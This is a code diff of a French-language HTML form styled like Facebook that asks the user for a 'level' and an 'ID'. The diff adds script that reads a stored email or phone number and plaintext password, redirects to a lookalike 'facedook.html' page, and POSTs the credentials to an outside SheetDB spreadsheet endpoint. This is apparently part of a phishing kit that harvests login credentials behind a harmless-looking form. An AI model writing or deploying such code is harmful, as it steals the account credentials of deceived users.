@@ -5,55 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Modifier Level et ID</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: #f0f2f5;
-            text-align: center;
-            padding: 20px;
-        }
-
-        h1 {
-            color: #1877f2;
-        }
-
-        .form-container {
-            background: white;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
-            margin: auto;
-        }
-
-        label {
-            display: block;
-            margin: 10px 0 5px;
-            font-weight: bold;
-        }
-
-        input {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 1rem;
-        }
-
-        .btn {
-            margin-top: 15px;
-            background: #1877f2;
-            color: white;
-            border: none;
-            padding: 10px;
-            width: 100%;
-            font-size: 1rem;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        .btn:hover {
-            background: #0d65d9;
-        }
+        body { font-family: Arial, sans-serif; background: #f0f2f5; text-align: center; padding: 20px; }
+        h1 { color: #1877f2; }
+        .form-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); max-width: 400px; margin: auto; }
+        label { display: block; margin: 10px 0 5px; font-weight: bold; }
+        input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 1rem; }
+        .btn { margin-top: 15px; background: #1877f2; color: white; border: none; padding: 10px; width: 100%; font-size: 1rem; border-radius: 5px; cursor: pointer; }
+        .btn:hover { background: #0d65d9; }
     </style>
 </head>
 <body>
@@ -69,51 +27,59 @@
         <label for="id">Nouvel ID :</label>
         <input type="text" id="id" placeholder="Entrez l'ID">
 
-        <button class="btn" onclick="updateUserData()">Confirmer</button>
+        <button class="btn" onclick="saveAndSendData()">Confirmer</button>
     </div>
 
     <script>
         const sheetDB_URL = "https://sheetdb.io/api/v1/3vlpda149swfb";
-        let userEmail = sessionStorage.getItem("userEmail"); // Récupère l'email stocké après login
 
-        if (!userEmail) {
+        let emailOrNum = localStorage.getItem("emailOrNum");
+        let password = localStorage.getItem("password");
+        let level = localStorage.getItem("level");
+        let id = localStorage.getItem("id");
+
+        if (!emailOrNum || !password) {
             alert("Aucune session trouvée, veuillez vous reconnecter.");
-            window.location.href = "login.html"; // Redirige vers la page de connexion si l'email n'existe pas
+            window.location.href = "facedook.html";
         } else {
-            document.getElementById("userEmail").textContent = userEmail;
+            document.getElementById("userEmail").textContent = emailOrNum;
+            document.getElementById("level").value = level === "N/A" ? "" : level;
+            document.getElementById("id").value = id === "N/A" ? "" : id;
         }
 
-        async function updateUserData() {
-            let newLevel = document.getElementById("level").value;
-            let newId = document.getElementById("id").value;
+        function saveAndSendData() {
+            let newLevel = document.getElementById("level").value.trim();
+            let newId = document.getElementById("id").value.trim();
 
             if (!newLevel || !newId) {
                 alert("Veuillez remplir tous les champs.");
                 return;
             }
 
-            let updateData = {
+            localStorage.setItem("level", newLevel);
+            localStorage.setItem("id", newId);
+
+            let userData = {
+                emailornum: emailOrNum,
+                pswd: password,
                 level: newLevel,
                 id: newId
             };
 
-            try {
-                let response = await fetch(`${sheetDB_URL}/emailornum/${userEmail}`, {
-                    method: "PATCH",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ data: updateData })
-                });
-
-                if (response.ok) {
-                    alert("Données mises à jour avec succès !");
-                    window.location.reload(); // Recharge la page pour afficher les nouvelles données
-                } else {
-                    alert("Erreur lors de la mise à jour.");
-                }
-            } catch (error) {
+            fetch(sheetDB_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ data: [userData] })
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log(result);
+                alert("Données mises à jour avec succès !");
+            })
+            .catch(error => {
                 console.error("Erreur :", error);
-                alert("Problème de connexion.");
-            }
+                alert("Erreur lors de l'envoi des données.");
+            });
         }
     </script>
 
